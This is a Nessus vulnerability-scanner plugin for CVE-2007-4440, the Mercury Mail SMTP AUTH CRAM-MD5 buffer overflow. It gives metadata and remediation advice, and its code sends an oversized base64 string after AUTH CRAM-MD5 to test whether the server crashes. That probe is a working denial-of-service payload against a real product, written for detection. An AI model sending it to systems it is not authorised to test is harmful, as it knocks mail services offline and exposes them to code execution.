#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(25928);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2007-4440");
  script_bugtraq_id(25357);
  script_xref(name:"EDB-ID", value:"4294");
  script_xref(name:"OSVDB", value:"39669");

  script_name(english:"Mercury SMTP Server AUTH CRAM-MD5 Remote Buffer Overflow");
  script_summary(english:"Tries to crash the SMTP server");

 script_set_attribute(attribute:"synopsis", value:
"The remote mail server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the Mercury Mail Transport System, a free
suite of server products for Windows and NetWare associated with
Pegasus Mail. 

The version of Mercury Mail installed on the remote host includes an
SMTP server that is affected by a buffer overflow flaw.  Using a
specially crafted 'AUTH CRAM-MD5' request, an unauthenticated, remote
attacker can leverage this issue to crash the remote application and
even execute arbitrary code remotely, subject to the privileges under
which the application runs." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?349dac79" );
 script_set_attribute(attribute:"see_also", value:"http://community.pmail.com/forums/thread/3816.aspx" );
 script_set_attribute(attribute:"see_also", value:"http://www.pmail.com/m32_451.htm" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Mercury/32 v4.52 or later or apply the 4.01c / 1.49
security patch." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"exploit_framework_core", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'Mercury Mail SMTP AUTH CRAM-MD5 Buffer Overflow');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_cwe_id(119);
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/08/23");
 script_cvs_date("$Date: 2016/05/20 14:12:06 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();


  script_category(ACT_DENIAL);
  script_family(english:"SMTP problems");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25);
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("smtp_func.inc");


port = get_service(svc:"smtp", default: 25, exit_on_fail: 1);
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);


# Open a connection.
soc = smtp_open(port:port);
if (!soc) exit(0);


# If it looks like Mercury...
c = string("EHLO ", this_host_name());
send(socket:soc, data:string(c, "\r\n"));
s = smtp_recv_line(socket:soc);
if (s && "ESMTPs are:" >< s)
{
  # Try to exploit the flaw to crash the daemon.
  c = 'AUTH CRAM-MD5';
  send(socket:soc, data:string(c, "\r\n"));
  s = smtp_recv_line(socket:soc);
  if ("334 " >< s)
  {
    c = base64(str:"AAA");
    c = crap(data:c, length:strlen(c)*10000);
    send(socket:soc, data:string(c, "\r\n"));
    s = smtp_recv_line(socket:soc);
    if (strlen(s) == 0 || "Attempted buffer overflow attack detected" >!< s) 
    {
      if (strlen(s)) sleep(1);

      # There's a problem if the server is now down.
      soc2 = smtp_open(port:port);
      if (!soc2) 
      {
        security_hole(port);
        exit(0);
      }

      smtp_close(socket:soc2);
    }
  }
}


# Be nice.
smtp_close(socket:soc);
